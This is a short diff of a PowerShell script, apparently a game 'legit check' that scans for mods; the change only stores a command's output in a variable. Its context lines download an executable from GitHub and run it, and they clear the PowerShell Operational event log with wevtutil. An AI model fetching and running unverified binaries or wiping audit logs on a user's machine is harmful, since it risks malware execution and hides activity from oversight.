@@ -116,7 +116,7 @@ Write-Host ""
 #Mods check
 Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/ehp.exe" -OutFile "8.exe"
 Write-Host "Mods check:"
-Invoke-Expression ".\8.exe javaw.exe /mods/ /addons"
+$puk = Invoke-Expression ".\8.exe javaw.exe /mods/ /addons"
 Write-Host ""
 #END
 
@@ -329,6 +329,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
